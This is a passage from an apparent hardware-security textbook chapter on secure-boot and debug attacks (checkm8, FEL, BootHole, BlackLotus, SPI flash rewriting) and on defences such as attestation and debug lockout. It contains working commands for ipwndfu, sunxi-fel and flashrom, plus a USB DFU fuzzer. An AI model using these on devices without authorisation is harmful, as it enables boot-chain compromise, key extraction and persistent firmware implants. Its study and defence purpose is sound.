**checkm8 (CVE-2019-8900).** A use-after-free in Apple's BootROM USB stack (the DFU — Device Firmware Update — mode handler). When the device enters DFU mode, the BootROM allocates a buffer for the USB transfer, processes the data, and frees the buffer. By sending a specific sequence of USB control transfers (an incomplete DFU upload followed by a DFU abort in a specific timing window), the attacker can cause the BootROM to free the buffer while a pointer to it is still in use. A subsequent USB transfer allocates a new buffer at the same address, and the BootROM's stale pointer now references attacker-controlled data. This gives the attacker arbitrary code execution in the BootROM context — before any signature verification occurs.

checkm8 affects all Apple devices with A5 through A11 SoCs (iPhone 4S through iPhone X, multiple iPad generations). It cannot be patched because it is in mask ROM. Apple's mitigation was to redesign the BootROM USB stack in the A12 SoC (iPhone XS and later). checkm8 is the basis for the checkra1n jailbreak tool, which uses the exploit to load a modified iBoot that disables signature verification and boots an unsigned kernel.

The DFU race condition mechanism works as follows. The SecureROM allocates an I/O buffer via its internal heap allocator when a DFU download request arrives. The exploit sends a USB control transfer with a specific `wLength` value that triggers the allocation, then immediately sends a USB DFU abort (bmRequestType=0x21, bRequest=DFU_ABORT). The abort tears down the USB state but leaves a dangling pointer in the DFU state machine's context structure. The exploit then re-enters DFU mode and sends a carefully sized payload that is placed at the same heap address (heap feng shui). The SecureROM's stale pointer now dereferences attacker-controlled data, and the attacker gains control of the program counter. The heap feng shui in SecureROM is constrained by the BootROM's small heap (typically 64–128 KB of SRAM) and the limited number of allocatable objects, making the heap layout relatively deterministic — a significant advantage over user-space heap exploitation.

```bash
# ipwndfu: exploit checkm8 to enter pwned DFU mode
# Prerequisites: device in DFU mode (hold Home+Power, release Power)
cd ipwndfu
python3 ipwndfu -p

# Once in pwned DFU, dump the SecureROM (BootROM)
python3 ipwndfu --dump-rom

# Dump the device's GID key (hardware AES key used for firmware decryption)
python3 ipwndfu --dump-gid

# Boot a custom payload (unsigned code execution in BootROM context)
python3 ipwndfu --boot custom_payload.bin

# checkra1n: full jailbreak chain using checkm8
# On Linux host:
sudo checkra1n -c    # CLI mode, auto-detect device in DFU
```

**Allwinner FEL mode.** Allwinner SoCs (used in many low-cost ARM boards and tablets) have a FEL (Force Execution at Low level) mode: a BootROM feature that allows loading and executing code via USB without any signature verification. FEL is intended for factory programming and recovery, but on many Allwinner devices it is accessible by holding a specific button during power-on or by shorting specific pins. FEL provides a complete bypass of any secure boot implementation in the higher-level bootloaders.

The `sunxi-fel` tool (from the sunxi-tools project) provides full interaction with the FEL protocol. Through FEL, the attacker has unrestricted read/write access to the SoC's memory map and can execute arbitrary code on the ARM core — all without any authentication.

```bash
# Detect an Allwinner SoC in FEL mode
sunxi-fel ver

# Read 1 MB of memory starting at address 0 (SRAM / BootROM area)
sunxi-fel read 0x00000000 0x100000 bootrom_dump.bin

# Read the SoC's SID (Security ID / unique chip identifier, in SRAM)
sunxi-fel read 0x01c23800 0x20 sid.bin

# Write and execute arbitrary code on the target
sunxi-fel write 0x40000000 payload.bin
sunxi-fel exe 0x40000000

# Load U-Boot directly via FEL (bypassing any flash-based secure boot)
sunxi-fel uboot u-boot-sunxi-with-spl.bin
```

**MediaTek BROM.** MediaTek's BootROM (BROM) on various SoCs contains vulnerabilities in the download-mode USB handler (similar in nature to checkm8). The brom-lite and mtk-bypass tools exploit these vulnerabilities to execute arbitrary code in the BootROM context, bypassing MediaTek's secure boot chain. Multiple CVEs (including CVE-2020-0069, which affected the MediaTek SU vulnerability allowing root access from an app) have been disclosed in MediaTek's boot chain.

### 6.2 Bootloader vulnerabilities

**GRUB2 BootHole (CVE-2020-10713).** A buffer overflow in GRUB2's configuration file parser (grub.cfg). The UEFI Secure Boot chain verifies the GRUB2 binary (which is signed by the distribution's key, authorized via shim/MOK), but GRUB2 then reads its configuration file from disk without verifying its signature. An attacker who modifies grub.cfg can trigger the buffer overflow during config parsing, achieving code execution within the signed GRUB2 process — effectively bypassing Secure Boot without modifying any signed binary.

The vulnerability is in GRUB2's `grub_parser_split_cmdline()` function, which processes configuration lines. A crafted grub.cfg with an excessively long line overflows a stack buffer. The Eclypsium PoC demonstrates the attack: mount the EFI System Partition, replace grub.cfg with a crafted configuration that contains a trigger string exceeding the parser's buffer size, and reboot. The signed GRUB2 binary loads, reads the malicious grub.cfg, and the overflow redirects execution to attacker-controlled shellcode embedded in the configuration file itself.

```bash
# BootHole PoC — crafting a malicious grub.cfg
# The overflow occurs in the config parser when processing long tokens.
# A simplified example (the real exploit requires precise offset calculation):

# Mount the EFI System Partition
sudo mount /dev/sda1 /mnt/efi

# Back up the original grub.cfg
sudo cp /mnt/efi/EFI/ubuntu/grub.cfg /mnt/efi/EFI/ubuntu/grub.cfg.bak

# The crafted grub.cfg contains a line that overflows the parser buffer.
# The payload is embedded after the overflow offset.
# (Actual exploit construction requires binary analysis of the specific
# GRUB2 build to determine buffer sizes and return address offsets.)

# Verify the GRUB2 binary is signed and in db (it will pass Secure Boot)
sbverify --list /mnt/efi/EFI/ubuntu/grubx64.efi
```

The mitigation required a multi-vendor coordinated response: Microsoft issued dbx updates to revoke vulnerable GRUB2 binaries, Linux distributions rebuilt GRUB2 with the vulnerability fixed and signed the new binaries, and the shim/MOK infrastructure was updated to enforce additional verification. The BootHole incident highlighted the fragility of the UEFI Secure Boot chain: a single vulnerability in any signed component can undermine the entire chain.

**U-Boot verified boot bypass.** U-Boot (the Universal Boot Loader, used on most embedded Linux platforms) has a history of security vulnerabilities in its verified-boot implementation: format string bugs in the console parser, buffer overflows in the filesystem drivers (FAT, ext4, UBIFS), and logic errors in the FIT image signature verification. CVE-2018-18440 (U-Boot verified-boot bypass via FIT image manipulation) allowed an attacker to construct a FIT image that passed U-Boot's signature verification but contained an unsigned payload. The unsigned payload was loaded and executed, bypassing verified boot entirely. Further techniques include exploiting U-Boot's environment variable processing: if the U-Boot environment is stored in unprotected storage (e.g., a raw NAND partition without integrity protection), the attacker can modify `bootcmd` to redirect the boot sequence to an attacker-controlled image, or modify `bootargs` to disable dm-verity or SELinux in the kernel command line. On devices where the U-Boot console is accessible (via UART), the attacker can interrupt the autoboot sequence (typically by pressing a key during the boot delay) and manually load unsigned images using `tftp`, `fatload`, or `mmc read` commands — bypassing verified boot entirely if the console is not locked.

### 6.3 UEFI Secure Boot bypass

**BlackLotus (CVE-2022-21894, "Baton Drop").** A UEFI bootkit that bypasses Secure Boot by exploiting CVE-2022-21894, a vulnerability in the Windows Boot Manager's handling of the BCD (Boot Configuration Data). The vulnerability allows the attacker to manipulate the boot configuration to load an older, vulnerable, and signed Windows Boot Manager (one that was signed by Microsoft but has a known bypass). Because the older Boot Manager is legitimately signed, Secure Boot allows it to execute; the vulnerability in the older Boot Manager then loads the attacker's unsigned bootkit.

The Baton Drop mechanism works as follows. The attacker places a legitimate but old, vulnerable copy of the Windows Boot Manager (bootmgfw.efi, signed by Microsoft) on the EFI System Partition alongside a crafted BCD store. The BCD contains a truncation parameter that exploits CVE-2022-21894 — during BCD processing, the vulnerable Boot Manager reads a serialized data structure whose length field has been manipulated, causing a buffer underflow that allows controlled memory corruption. The attacker uses this corruption to overwrite a function pointer in the Boot Manager's internal structures, redirecting execution to a shellcode stub also stored on the ESP. This stub disables Secure Boot enforcement in memory (clearing the EFI variable checks), loads the BlackLotus UEFI driver, and then chains to the legitimate Windows boot path. The BlackLotus driver persists by registering itself as a UEFI runtime service that survives the OS handoff, gaining kernel-level persistence. It also manipulates the MOK database to prevent shim-based Linux installations from detecting the modification, and patches the Windows Boot Manager in memory on subsequent boots to maintain persistence without re-exploiting the vulnerability.

BlackLotus was the first in-the-wild UEFI bootkit to bypass Secure Boot on fully updated Windows 11 systems. Microsoft's mitigation involved adding the vulnerable Boot Manager hashes to dbx (revoking them), but the revocation required careful coordination because prematurely revoking Boot Manager hashes could render systems unbootable. As of early 2024, Microsoft was still in a phased rollout of the full dbx revocation.

**NVRAM manipulation.** UEFI Secure Boot configuration (PK, KEK, db, dbx) is stored in UEFI NVRAM (a region of the SPI flash, typically in a Fault Tolerant Working block or in UEFI variable store partitions within the flash layout). An attacker with physical access to the SPI flash (using a SPI flash programmer — CH341A with a SOIC-8 clip, FlashcatUSB, or Dediprog SF600, as described in Chapter 17C §5.1) can modify the NVRAM directly: clearing the PK (which disables Secure Boot entirely — when no PK is enrolled, Secure Boot enters Setup Mode and does not enforce signature checking), adding their own self-signed certificate to db (authorizing their bootkit while keeping Secure Boot nominally enabled, which makes the compromise harder to detect), removing specific entries from dbx (re-enabling revoked binaries that contain known exploitable vulnerabilities), or modifying the KEK to authorize future key updates without the OEM's involvement. This attack requires physical access to the SPI flash chip and bypasses Secure Boot entirely. The UEFITool utility can parse the SPI flash dump to identify the NVRAM region, and the UEFI Variable Editing tools can modify specific variables within the dump before reflashing. Detection: the TPM's PCR7 records the Secure Boot configuration state — changes to PK/KEK/db/dbx between boots cause PCR7 to change, which is detectable via remote attestation.

### 6.4 SPI flash modification

The UEFI/BIOS firmware is stored on an SPI NOR flash chip connected to the platform's SPI bus. An attacker with physical access can read, modify, and rewrite this flash using an SPI programmer (CH341A, FlashcatUSB, Dediprog) connected to a SOIC clip or soldered directly to the flash chip's pins.

SPI flash modification enables: replacing the UEFI firmware with a backdoored version, modifying Boot Guard's IBB (if Boot Guard is not enforced), injecting UEFI rootkits (implants in the firmware's DXE driver list), and modifying the NVRAM (Secure Boot keys, boot configuration). The attack is constrained by: Boot Guard enforcement (if the CPU verifies the IBB against fused keys, modifying the IBB causes a boot failure — unless Boot Guard is misconfigured, §5.4), Intel BIOS Guard (a hardware mechanism that verifies BIOS update integrity using signed update capsules — but BIOS Guard only protects against software-based flash modification, not physical), and write-protect mechanisms (some platforms have a WP pin on the SPI flash that, when asserted, prevents writes — but the attacker with physical access can simply desolder the WP pull-up resistor or drive the WP pin low).

The `flashrom` utility is the standard open-source tool for SPI flash interaction. It supports hundreds of flash chips and multiple programmer interfaces.

```bash
# Read the entire SPI flash contents (typically 8-32 MB)
flashrom -p ch341a_spi -r bios_dump.bin

# Verify the read by dumping twice and comparing
flashrom -p ch341a_spi -r bios_dump_verify.bin
sha256sum bios_dump.bin bios_dump_verify.bin  # must match

# After modifying the dump (e.g., with UEFITool to patch Secure Boot keys
# or inject a DXE driver), write the modified image back:
flashrom -p ch341a_spi -w bios_modified.bin

# For in-system programming (without desoldering the flash chip):
# Use the internal programmer (requires root on the target system)
flashrom -p internal -r bios_dump.bin

# Dediprog SF600 programmer (higher speed, more reliable):
flashrom -p dediprog -r bios_dump.bin

# Verify the write
flashrom -p ch341a_spi -v bios_modified.bin
```

**Intel Boot Guard bypass via ME manufacturing mode.** Intel's Management Engine (ME, now CSME) has a manufacturing mode that disables certain security enforcements during OEM manufacturing. If the ME is left in manufacturing mode (due to an OEM configuration error), the platform's Boot Guard enforcement can be weakened or disabled. The manufacturing mode status is readable via the HECI interface. Research by Positive Technologies demonstrated that ME manufacturing mode on some platforms allows writing to the ME region of the SPI flash, modifying the Boot Guard policy, and altering the Key Manifest. Detecting manufacturing mode requires reading the ME status registers via HECI or via the chipsec framework.

```bash
# CHIPSEC: check if Intel ME is in manufacturing mode
sudo python3 chipsec_main.py -m common.me_mfg_mode

# CHIPSEC: audit Boot Guard configuration
sudo python3 chipsec_main.py -m common.secureboot.te

# CHIPSEC: check SPI flash write protection
sudo python3 chipsec_main.py -m common.spi_lock

# Read ME manufacturing mode status via MEInfo (Intel tool)
sudo MEInfoLinux64 -fwstatus
```

### 6.5 Downgrade attacks

Downgrade attacks exploit the gap between the current firmware version (which may have security fixes) and an older version (which has known vulnerabilities). If the boot chain allows loading an older firmware version, the attacker downgrades to the vulnerable version, exploits the known vulnerability, and then upgrades back (or persists at the lower version).

**Anti-rollback counters.** Modern secure boot implementations use monotonic counters (stored in OTP fuses or RPMB) that increment with each firmware update. The bootloader checks the firmware's version number against the counter value and refuses to boot firmware with a lower version number. Anti-rollback counters are effective but irreversible — once incremented, the counter cannot be decremented (it's in OTP fuses). This means: (1) a firmware update that increments the counter is a one-way operation, (2) if the new firmware has a critical bug, rolling back to the previous version is impossible (the device must be updated to a newer fixed version), and (3) an attacker who can manipulate the counter (via fault injection on the fuse-read circuit, Chapter 17B §4.2) can bypass anti-rollback.

**SHSH blob replay (iOS).** On older iOS devices (pre-A12), researchers captured SHSH blobs during the signing window for a specific firmware version and replayed them later (after Apple closed the signing window) to downgrade to that version. Apple's nonce-entangled signing (introduced with A12) prevents SHSH replay by binding each SHSH blob to a nonce generated by the device at boot — the nonce changes with each boot, so a captured SHSH blob is valid only for the boot cycle during which it was captured.

### 6.6 DFU and recovery mode attacks

Device Firmware Update (DFU) and recovery modes are vendor-specific boot modes that allow firmware loading via USB (or other interfaces) for factory programming, recovery from bricked states, and field updates. These modes are implemented in the BootROM (making them immutable and always accessible) and typically run a USB stack that processes commands from a host tool.

DFU modes are a prime attack surface because: the USB stack is complex (USB enumeration, control transfers, bulk transfers, protocol handling), the BootROM code is not patchable (vulnerabilities persist for the device's lifetime), and the USB interface is accessible with basic equipment (any USB cable and a host computer). checkm8 (§6.1) is the canonical example of a DFU mode exploit.

Other DFU attack vectors: USB descriptor overflow (oversized USB descriptors that overflow a fixed-size buffer in the BootROM's USB handler), vendor-specific command injection (proprietary DFU commands that were intended for factory use but are accessible in the field), and protocol confusion (sending non-DFU USB traffic during the DFU state machine's initialization, causing unexpected state transitions).

**Tegra boot chain attacks.** NVIDIA Tegra SoCs (used in the Nintendo Switch and NVIDIA Jetson platforms) have a recovery mode called RCM (Recovery Mode) that accepts unsigned payloads via USB. On the Tegra X1 (used in the original Nintendo Switch), the RCM handler has a vulnerability (CVE-2018-6242, "Fusée Gelée") in the USB control transfer handler: the DMA buffer length is derived from the USB packet's wLength field without validation, allowing the attacker to overwrite the BootROM's execution stack. Because the vulnerability is in mask ROM, all Tegra X1 chips manufactured before the hardware revision (Tegra X1+ / Mariko) are permanently vulnerable. The exploit provides arbitrary code execution at the BootROM level, bypassing all subsequent secure boot stages. The Nintendo Switch modding community's Atmosphère custom firmware uses Fusée Gelée as its entry point.

**UART-based boot attacks.** Many SoCs expose a UART-based boot protocol alongside USB DFU. The UART boot mode is typically entered by holding a specific pin low (or high) during reset. UART boot protocols tend to be simpler than USB (no complex descriptor parsing, no DMA — just serial byte reception) and thus have a smaller attack surface. However, UART boot modes that accept unencrypted, unsigned firmware images (common on development-grade SoCs from Allwinner, Rockchip, and Amlogic) provide a trivial boot chain bypass — the attacker connects a USB-UART adapter, enters UART boot mode, and loads arbitrary firmware with no authentication. On production devices, UART boot should be disabled via OTP fuses, and the UART boot code path in the BootROM should verify signatures just as the normal boot path does.

### 6.7 RISC-V debug considerations

RISC-V's debug specification (RISC-V External Debug Support version 0.13.2 / 1.0) defines a debug architecture analogous to ARM CoreSight but with RISC-V-specific characteristics. The RISC-V debug module is accessed through a Debug Transport Module (DTM) — typically JTAG or cJTAG — that provides access to the Debug Module Interface (DMI). The DMI contains registers for: halting and resuming harts (RISC-V processing cores), accessing GPRs and CSRs (Control and Status Registers), setting hardware breakpoints (via triggers — tdata1/tdata2/tdata3 CSRs), and performing memory access (either through the Abstract Access Memory command or through a Program Buffer that executes arbitrary RISC-V instructions in the debug context).

The RISC-V debug spec defines authentication via the dmstatus.authenticated bit and the authdata register: if the debug module requires authentication, the debugger must write the correct authentication value to authdata before debug operations are permitted. However, the spec leaves the authentication mechanism entirely to the implementor — there is no standardized authentication protocol (unlike ARM's SDC). In practice, many RISC-V implementations either leave authentication unimplemented (dmstatus.authenticated permanently set to 1) or implement trivial authentication (a fixed password checked against a hardcoded value — vulnerable to brute force and reverse engineering). The lack of a standardized, cryptographically robust debug authentication mechanism is a significant gap in the RISC-V ecosystem compared to ARM's CoreSight SDC.

RISC-V debug access via JTAG follows the standard IEEE 1149.1 TAP state machine (§1.1), with RISC-V-specific JTAG instructions: DTMCS (Debug Transport Module Control and Status — provides DTM identification and reset), DMI (Debug Module Interface — read/write access to the debug module's register space). The DTM acts as a bridge between the JTAG scan chain and the DMI register interface. Tools: OpenOCD supports RISC-V debug (via the `riscv` target type), and the RISC-V Foundation's spike simulator provides a reference JTAG debug implementation. For RISC-V-based IoT devices (ESP32-C3, GD32VF103, BL602/BL702), the same physical debug attack methodology applies as for ARM targets: identify the debug pins (§4), connect a JTAG probe, read the DTMCS register to confirm connectivity, then access memory and registers through the DMI.

### 6.8 BootROM analysis and exploitation

Analyzing a BootROM requires a combination of static reverse engineering and dynamic interaction with the device's recovery mode. The BootROM image may be obtained by dumping it through an existing exploit (as with checkm8's `--dump-rom` capability), by reading the mask ROM via chip decapping and optical readout (Chapter 17C §5.5), or by exploiting a debug port that has access to the ROM's address range.

**Ghidra script for BootROM analysis.** Once a BootROM binary is obtained, Ghidra provides the primary analysis environment. The following Python script automates the identification of common BootROM structures — USB descriptor tables, signature verification routines, and memory allocator functions — that are the typical vulnerability surface.

```python
# Ghidra headless script: bootrom_analyzer.py
# Run with: analyzeHeadless /tmp/ghidra_project bootrom_analysis \
#           -import bootrom.bin -processor ARM:LE:32:Cortex \
#           -scriptPath . -postScript bootrom_analyzer.py
from ghidra.program.model.data import StringDataType
from ghidra.program.model.symbol import SourceType

fm = currentProgram.getFunctionManager()
listing = currentProgram.getListing()
mem = currentProgram.getMemory()

# Locate USB descriptor structures (magic bytes: 0x12 0x01 for device descriptor)
usb_device_desc_sig = bytes([0x12, 0x01])
addr = mem.findBytes(mem.getMinAddress(), usb_device_desc_sig, None, True,
                     monitor)
while addr is not None:
    # Check if this looks like a valid USB device descriptor
    bcd_usb = mem.getShort(addr.add(2))
    if 0x0100 <= bcd_usb <= 0x0320:
        createLabel(addr, "USB_DEVICE_DESCRIPTOR_%s" % addr, True)
        println("[*] USB Device Descriptor at %s (bcdUSB=0x%04X)" %
                (addr, bcd_usb))
    addr = mem.findBytes(addr.add(1), usb_device_desc_sig, None, True,
                         monitor)

# Locate potential signature verification: look for common RSA/SHA constants
# SHA-256 initial hash values (first word: 0x6A09E667)
sha256_init = bytes([0x67, 0xE6, 0x09, 0x6A])  # little-endian
addr = mem.findBytes(mem.getMinAddress(), sha256_init, None, True, monitor)
while addr is not None:
    createLabel(addr, "SHA256_INIT_HASH_%s" % addr, True)
    println("[*] SHA-256 init constants at %s" % addr)
    addr = mem.findBytes(addr.add(1), sha256_init, None, True, monitor)

# Locate heap allocator patterns: look for linked-list metadata structures
# typical of embedded malloc (chunk header: size | flags)
println("[*] Analysis complete. Review labeled addresses for attack surface.")
```

**Binary diffing BootROM versions with BinDiff.** When multiple BootROM versions exist (e.g., silicon revisions of the same SoC where the vendor patched vulnerabilities), BinDiff identifies functions that changed between revisions. The changed functions are the highest-priority analysis targets because they likely contain the patches for known vulnerabilities — and by extension, the pre-patch functions in the older ROM reveal the vulnerability. The workflow: export Ghidra analysis for both ROM versions as BinExport files, run BinDiff to compare them, and focus on functions with low similarity scores (below 0.95) in security-relevant modules (USB handling, image parsing, signature verification).

**USB descriptor fuzzing for DFU/recovery mode.** BootROM USB stacks are a rich attack surface because they parse complex structured data (USB descriptors, DFU protocol messages) with minimal error handling. The following Python script uses `pyusb` to fuzz USB control transfers against a device in DFU mode, targeting the descriptor parsing and DFU command handling code paths.

```python
import usb.core
import usb.util
import struct
import random
import time

def find_dfu_device(vid=None, pid=None):
    """Find any device in DFU mode (interface class 0xFE, subclass 0x01)."""
    devices = usb.core.find(find_all=True)
    for dev in devices:
        for cfg in dev:
            for intf in cfg:
                if intf.bInterfaceClass == 0xFE and \
                   intf.bInterfaceSubClass == 0x01:
                    return dev
    return None

def fuzz_control_transfer(dev, iterations=10000):
    """Send malformed USB control transfers to the DFU device."""
    DFU_DNLOAD  = 1
    DFU_UPLOAD  = 2
    DFU_GETSTATUS = 3
    DFU_ABORT   = 6

    for i in range(iterations):
        bm_request_type = random.choice([0x21, 0xA1, 0x80, 0x00, 0xC0])
        b_request = random.choice([DFU_DNLOAD, DFU_UPLOAD, DFU_GETSTATUS,
                                   DFU_ABORT, random.randint(0, 255)])
        w_value = random.randint(0, 0xFFFF)
        w_index = random.randint(0, 3)
        # Generate payload with boundary sizes (0, 1, 64, 512, 4096, 65535)
        size = random.choice([0, 1, 8, 64, 512, 2048, 4096, 0xFFFF])
        data = bytes(random.getrandbits(8) for _ in range(min(size, 4096)))

        try:
            if bm_request_type & 0x80:  # IN transfer
                dev.ctrl_transfer(bm_request_type, b_request, w_value,
                                  w_index, size, timeout=500)
            else:  # OUT transfer
                dev.ctrl_transfer(bm_request_type, b_request, w_value,
                                  w_index, data, timeout=500)
        except usb.core.USBError:
            pass  # expected — most malformed requests are rejected
        except usb.core.USBTimeoutError:
            print(f"[!] Timeout at iteration {i}: "
                  f"bmReqType=0x{bm_request_type:02X} "
                  f"bReq=0x{b_request:02X} wVal=0x{w_value:04X} "
                  f"size={size}")
        # Check if device is still alive
        try:
            dev.ctrl_transfer(0xA1, DFU_GETSTATUS, 0, 0, 6, timeout=1000)
        except Exception:
            print(f"[!] Device unresponsive after iteration {i} — "
                  f"possible crash")
            time.sleep(2)
            dev = find_dfu_device()
            if dev is None:
                print("[!] Device did not re-enumerate — hard crash")
                return

dev = find_dfu_device()
if dev:
    print(f"[*] Found DFU device: {dev.idVendor:04X}:{dev.idProduct:04X}")
    fuzz_control_transfer(dev)
else:
    print("[-] No DFU device found")
```

**Heap spray in constrained BootROM environments.** BootROM heaps are small (typically 32–128 KB of SRAM), which makes heap layout highly deterministic compared to user-space exploitation. The attacker's strategy is to fill the heap with controlled data such that any freed chunk will be replaced by attacker content when reallocated. In USB-based BootROM exploitation, the heap spray is performed by sending multiple USB transfers of specific sizes: each transfer allocates a heap chunk, and by controlling the size and content of each transfer, the attacker shapes the heap layout to place controlled data at a predictable address. The determinism of BootROM heaps (no ASLR, no concurrent allocations from other threads, small number of chunk sizes in use) means that heap feng shui techniques that are unreliable in user-space are highly reproducible in the BootROM context. The checkm8 exploit demonstrates this: the heap layout after the use-after-free is shaped by exactly two USB transfers of known sizes, achieving reliable control of the freed chunk's content on every attempt.

---

## 7. Detection and defense

### 7.1 Debug interface lockout verification

Verifying that debug interfaces are properly locked on production devices is a critical security assurance step. The verification process:

**SWD/JTAG connection attempt.** Connect a debug probe (J-Link, ST-Link, CMSIS-DAP) to the device's SWD/JTAG pins and attempt to read the DP IDCODE. If the connection succeeds, the debug interface is not locked. If the connection fails (ACK=FAULT, no response, or the probe reports "no target detected"), the debug interface may be locked — but a lock indication from the probe is not definitive (the connection may have failed for other reasons: wrong pin assignment, incorrect voltage level, incorrect protocol).

**DBGAUTHSTATUS verification.** If any level of debug access is available, read the `DBGAUTHSTATUS_EL1` register (MEM-AP address 0xE000EDF8 on Cortex-M, or through the debug ROM Table on Cortex-A). This register reports the state of all four debug authentication signals (DBGEN, NIDEN, SPIDEN, SPNIDEN). A production device should show all four signals de-asserted (0).

**OTP fuse verification.** Read the OTP fuse register that controls debug lockout (the specific register varies by SoC: APPROTECT on nRF52, RDP Option Bytes on STM32, JTAG_DISABLE on some Qualcomm SoCs). Verify that the fuse is programmed to the most restrictive level. This verification can be done via SWD (if debug is partially enabled) or by reading the OTP memory through a side channel (e.g., the SoC may expose OTP status through a UART boot message or through a vendor-specific diagnostic interface).

### 7.2 Boot integrity measurement and remote attestation

Measured boot with remote attestation provides a mechanism for verifying that a device booted the expected firmware, without trusting the device itself. The TPM (Trusted Platform Module, covered in depth in Domain 27A) measures each boot stage by extending a hash of the boot component into one of its Platform Configuration Registers (PCRs). PCR extension is a one-way operation: `PCR_new = SHA-256(PCR_old || measurement)`. The final PCR values represent the cumulative hash of the entire boot chain.

A remote verifier requests the device's PCR values (via the TPM's attestation protocol — the TPM signs the PCR values with a device-specific attestation key, preventing forgery) and compares them against known-good reference values. If the PCR values match, the device booted the expected firmware. If they differ, the boot chain was modified (by a bootkit, a downgrade attack, or firmware tampering).

Remote attestation limitations: the verifier must maintain a database of expected PCR values for every authorized firmware configuration (every firmware version × every hardware variant = a large matrix), PCR values are fragile (any change to any boot component, including legitimate firmware updates, changes the PCR values), and attestation only verifies what was booted, not what is currently running (a sophisticated attacker could boot the legitimate firmware, pass attestation, and then load a rootkit after attestation completes — though runtime integrity monitoring, Domain 27C, addresses this gap).

### 7.3 Secure boot event logging

Modern UEFI implementations log all Secure Boot events to the TCG Event Log (a TPM-associated data structure that records each PCR extension event along with the identity of the measured component). The event log provides a detailed record of the boot process: which UEFI drivers were loaded, which Secure Boot key checks were performed, which PCI Option ROMs were measured, and whether any verification failures occurred.

The event log is accessible to the OS (via the ACPI table TCPA or TPM2 table) and to remote verifiers (included with attestation quotes). Security monitoring agents should ingest the event log and alert on: unexpected UEFI drivers in the boot chain, Secure Boot verification failures (which should halt boot on a properly configured system but are logged regardless), changes to the Secure Boot key databases (PK, KEK, db, dbx modifications between boots), and the absence of expected boot components (which may indicate that a boot stage was replaced or skipped).

### 7.4 Defense recommendations

For high-security deployments where physical-access attacks are in the threat model:

**Enable and verify debug lockout.** Program all debug-disable fuses to their most restrictive level. Verify lockout during incoming inspection (for purchased components) and production testing (for manufactured devices). For ARM platforms, ensure DBGEN, NIDEN, SPIDEN, and SPNIDEN are all de-asserted on production units.

**Implement a complete chain of trust.** Every boot stage must verify the next stage's signature. No stage should be skipped or verified by a weaker mechanism than its predecessors. Use hardware-rooted key storage (OTP fuses) for the root verification key, not software-programmable storage (flash, EEPROM).

**Enable anti-rollback.** Use monotonic counters in OTP fuses to prevent firmware downgrade attacks. Ensure the counter is incremented with each security-relevant firmware update.

**Protect the SPI flash.** Use the SPI flash's write-protect mechanism (WP pin) to prevent unauthorized firmware modification. On Intel platforms, enable BIOS Guard and Intel Boot Guard with verified boot enforcement. On ARM platforms, ensure the BootROM verifies the flash contents before execution.

**Monitor boot integrity.** Deploy TPM-based measured boot with remote attestation. Maintain reference PCR values for all authorized firmware configurations. Alert on PCR value changes that do not correlate with authorized firmware updates.

### 7.5 Debug protection bypass taxonomy

Debug protections on embedded devices vary widely in robustness. Understanding the hierarchy of protection mechanisms — and their known bypass techniques — is essential for both the attacker assessing a target and the defender choosing protections.

**Software-based debug disable (weakest).** The firmware writes to a debug-disable register during initialization (e.g., clearing the TRCENA bit in DEMCR, writing to a debug-lock register). This protection is trivially bypassed: the attacker connects the debug probe before the firmware runs (halting at reset using the VC_CORERESET mechanism in DEMCR), or uses a fault-injection glitch (Chapter 17B) to skip the debug-disable instruction. Defense: software-based debug disable provides no meaningful security and should never be relied upon as the sole protection.

**OTP fuse-based debug disable (moderate).** The SoC's boot logic reads an OTP fuse to determine whether debug is enabled. If the fuse is burned, the hardware blocks debug access before any software runs. This is the standard protection on production devices (STM32 RDP Level 2, nRF52 APPROTECT, NXP JTAG_DIS fuse). Bypass techniques: voltage glitching the fuse-read circuit (the SoC reads the fuse value during a narrow window at boot — a precisely timed voltage glitch during this window can cause the fuse to read as "not burned," enabling debug — Chapter 17B §8), electromagnetic fault injection targeting the fuse controller, and on some older SoCs, laser fault injection on the fuse sense amplifier. Defense: use SoCs with hardware-enforced fuse locking (where the fuse state is latched into a register that cannot be overridden by transient faults), implement glitch detectors that monitor supply voltage during the fuse-read window, and use redundant fuse reads (read the fuse multiple times and compare results — inconsistency indicates a fault attack).

**Hardware authentication-gated debug (strongest).** Debug access requires cryptographic authentication before the debug signals are asserted (ARM Secure Debug Channel, Infineon DAP authentication, NXP Secure JTAG). The attacker cannot access debug until they present a valid certificate or respond to a challenge. Bypass techniques: extracting the debug authentication key from a compromised device's OTP (via FIB cross-section, Chapter 17C §5.5), exploiting vulnerabilities in the authentication protocol's firmware implementation (buffer overflows in the certificate parser), or fault-injecting the authentication decision itself (glitching the comparison that checks the certificate signature). Defense: implement the authentication protocol in hardware (not firmware), use key diversification (each device has a unique debug authentication key, derived from a master key and the device's unique identifier — compromising one device's key does not compromise others), and implement rate limiting on authentication attempts (to prevent brute-force attacks on the challenge-response protocol).

### 7.6 Secure boot hardening beyond chain-of-trust

Chain-of-trust signature verification is necessary but not sufficient for robust secure boot. Additional hardening measures address attacks that target the boot process without attacking the signature verification directly.

**Boot time randomization.** Fixed boot timing enables precise fault-injection attacks (Chapter 17B §4). Introducing deliberate random delays at each boot stage (reading a hardware RNG and spinning for a random number of cycles before the signature check) forces the attacker to perform many more fault-injection attempts to find the correct glitch timing. The random delay should be seeded from a hardware entropy source, not from a PRNG with a fixed seed (which the attacker could predict).

**Redundant verification.** Perform each signature verification twice (or more) using independent code paths. Compare the results before proceeding. A single-glitch fault injection can bypass one verification but is unlikely to simultaneously bypass two independent checks (especially if they use different internal implementation paths — e.g., one using the hardware crypto accelerator and one using a software implementation). The redundancy must be implemented carefully to prevent the compiler from optimizing away the second check (use volatile flags, assembly barriers, or separate compilation units).

**Secure boot state machine with rollback detection.** Instead of a linear boot flow (verify → execute), implement a state machine that records progress in a tamper-resistant location (a write-once register, an OTP fuse, or a monotonic counter in the secure element). Each boot stage writes a progress marker before executing the next stage. If the device resets unexpectedly during boot (as would happen during a fault-injection campaign), the state machine detects the incomplete boot on the next attempt and can: increment a failure counter, impose an exponentially increasing boot delay, alert via a side channel (LED pattern, serial message, network beacon), or permanently lock out after N consecutive failures. This makes fault-injection campaigns (which require hundreds or thousands of attempts) impractical without triggering detection.

**Measured boot with runtime binding.** Extend measured boot beyond the boot chain into runtime: the kernel periodically re-measures its own code sections and compares against the boot-time measurements stored in TPM PCRs. If the measurements diverge, the system has been modified at runtime (e.g., by a kernel rootkit). This provides runtime integrity assurance that pure secure boot (which only verifies at boot time) cannot. Linux IMA (Integrity Measurement Architecture) implements this pattern: IMA measures every executable loaded by the kernel and extends the measurements into TPM PCR 10, enabling remote attestation of the runtime software state.

### 7.7 Detection and monitoring rules

